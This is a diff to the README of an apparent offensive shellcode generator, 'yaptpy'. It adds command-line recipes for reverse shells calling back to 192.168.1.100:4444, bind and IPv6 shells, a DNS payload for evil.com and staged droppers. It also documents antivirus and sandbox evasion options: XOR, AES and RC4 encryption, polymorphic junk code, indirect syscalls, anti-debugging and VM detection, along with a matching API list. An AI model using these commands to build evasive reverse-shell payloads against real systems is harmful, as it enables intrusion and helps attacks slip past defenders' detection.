@@ -35,43 +35,200 @@ shellcode = generate_payload(
 ## CLI
 
 ```bash
-yapt --help
+yaptpy --help
 ```
 
 Basic reverse shell:
 ```bash
-yapt --ip 192.168.1.100 --port 4444
+yaptpy --ip 192.168.1.100 --port 4444
 ```
 
 Obfuscated version with multiple techniques:
 ```bash
-yapt --ip 192.168.1.100 --port 4444 --junk --obfuscate-path --anti-debug --rle --xor-key 0xAA
+yaptpy --ip 192.168.1.100 --port 4444 --junk --obfuscate-path --anti-debug --rle --xor-key 0xAA
+```
+
+## Payload Types
+
+### Reverse Shell (default)
+```bash
+yaptpy --ip 192.168.1.100 --port 4444
+```
+
+### Bind Shell
+```bash
+yaptpy --bind --port 4444 --bind-addr 0.0.0.0
+```
+
+### IPv6
+```bash
+yaptpy --ip 2001:db8::1 --port 4444 --ipv6
+```
+
+### DNS Resolution
+```bash
+yaptpy --dns --domain evil.com
+```
+
+## Evasion Techniques
+
+### Encryption
+```bash
+# XOR encryption
+yaptpy --ip 192.168.1.100 --port 4444 --xor-key 0xAA
+
+# Rolling XOR encryption
+yaptpy --ip 192.168.1.100 --port 4444 --rolling-xor-key 0x42
+
+# AES-256 encryption
+yaptpy --ip 192.168.1.100 --port 4444 --aes-key 0123456789abcdef0123456789abcdef
+
+# RC4 encryption
+yaptpy --ip 192.168.1.100 --port 4444 --rc4-key deadbeef
+```
+
+### Encoding
+```bash
+# Base64 encoding
+yaptpy --ip 192.168.1.100 --port 4444 --base64
+
+# Base32 encoding
+yaptpy --ip 192.168.1.100 --port 4444 --base32
+
+# RLE encoding
+yaptpy --ip 192.168.1.100 --port 4444 --rle
+```
+
+### Obfuscation
+```bash
+# Polymorphic junk code
+yaptpy --ip 192.168.1.100 --port 4444 --junk
+
+# Enhanced polymorphic engine
+yaptpy --ip 192.168.1.100 --port 4444 --polymorphic
+
+# Obfuscate executable path
+yaptpy --ip 192.168.1.100 --port 4444 --obfuscate-path
+
+# Indirect syscalls
+yaptpy --ip 192.168.1.100 --port 4444 --indirect-syscalls
+
+# Stack pivot
+yaptpy --ip 192.168.1.100 --port 4444 --stack-pivot
+```
+
+### Anti-Analysis
+```bash
+# Anti-debugging (ptrace)
+yaptpy --ip 192.168.1.100 --port 4444 --anti-debug
+
+# Anti-emulation (rdtsc/cpuid)
+yaptpy --ip 192.168.1.100 --port 4444 --anti-emulation
+
+# VM/hypervisor detection
+yaptpy --ip 192.168.1.100 --port 4444 --vm-detect
+
+# Parent process check
+yaptpy --ip 192.168.1.100 --port 4444 --parent-check
+
+# Sleep evasion (sandbox bypass)
+yaptpy --ip 192.168.1.100 --port 4444 --sleep 60
+```
+
+### Advanced Payloads
+```bash
+# Egg hunter
+yaptpy --egg-hunter --egg deadbeef
+
+# Staged payload (dropper)
+yaptpy --ip 192.168.1.100 --port 4444 --staged
 ```
 
 ## API
 
-### `generate_payload(ip, port, executable_path, junk, anti_emulation, stack_pivot, obfuscate_path, anti_debug, indirect_syscalls) -> bytes`
+### Payload Generation
+
+#### `generate_payload(...) -> bytes`
 Generates core reverse shell payload with optional features.
 
-### `xor_encrypt(data: bytes, key: int) -> bytes`
+#### `egg_hunter(egg: bytes) -> bytes`
+Generates egg hunter shellcode.
+
+#### `generate_bind_shell(port: int, bind_addr: str) -> bytes`
+Generates bind shell shellcode.
+
+#### `generate_ipv6_reverse_shell(ipv6_addr: str, port: int) -> bytes`
+Generates IPv6 reverse shell shellcode.
+
+#### `generate_dns_resolve(domain: str) -> bytes`
+Generates DNS resolution payload.
+
+#### `generate_staged_payload(stage1_size: int) -> tuple[bytes, bytes]`
+Generates staged payload (stage1 and stage2).
+
+### Encryption Functions
+
+#### `xor_encrypt(data: bytes, key: int) -> bytes`
 Encrypts data using simple byte-wise XOR.
 
-### `rolling_xor_encrypt(data: bytes, key: int) -> bytes`
+#### `rolling_xor_encrypt(data: bytes, key: int) -> bytes`
 Encrypts data using rolling XOR (key increments).
 
-### `rle_encode(data: bytes) -> bytes`
-Encodes data using Run-Length Encoding.
+#### `base64_encode(data: bytes) -> bytes`
+Encodes data using Base64.
 
-### `generate_polymorphic_junk() -> bytes`
+#### `base32_encode(data: bytes) -> bytes`
+Encodes data using Base32.
+
+#### `aes_encrypt(data: bytes, key: bytes) -> bytes`
+Encrypts data using AES-CBC.
+
+#### `rc4_encrypt(data: bytes, key: bytes) -> bytes`
+Encrypts data using RC4 stream cipher.
+
+### Evasion Functions
+
+#### `generate_sleep_evasion(sleep_seconds: int) -> bytes`
+Generates sleep evasion code for sandbox bypass.
+
+#### `generate_vm_detection() -> bytes`
+Generates VM/hypervisor detection code.
+
+#### `generate_parent_check() -> bytes`
+Generates parent process check code.
+
+### Obfuscation Functions
+
+#### `substitute_instructions(asm_code: str) -> str`
+Applies instruction substitution obfuscation.
+
+#### `transposed_code(asm_lines: list[str]) -> list[str]`
+Applies code transposition obfuscation.
+
+#### `call_preceded_obfuscation(syscall_num: int) -> bytes`
+Applies call-preceded syscall obfuscation.
+
+#### `syscall_splitting(syscall_num: int) -> bytes`
+Applies syscall splitting obfuscation.
+
+#### `enhanced_polymorphic_engine(shellcode: bytes, junk_ratio: float) -> bytes`
+Applies enhanced polymorphic obfuscation to shellcode.
+
+### Utility Functions
+
+#### `api_hash(syscall_name: str) -> int`
+Computes API hash for syscall resolution.
+
+#### `generate_polymorphic_junk() -> bytes`
 Generates random non-functional assembly instructions.
 
-### `remove_comments_from_assembly(assembly_code: str) -> str`
+#### `remove_comments_from_assembly(assembly_code: str) -> str`
 Removes comments from assembly code.
 
-### `rle_decoder_stub(original_size: int) -> bytes`
+#### `rle_decoder_stub(original_size: int) -> bytes`
 Generates RLE decoder stub.
 
-### `rolling_xor_decoder_stub(original_size: int, start_key: int) -> bytes`
+#### `rolling_xor_decoder_stub(original_size: int, start_key: int) -> bytes`
 Generates rolling XOR decoder stub.
 
 ## Development
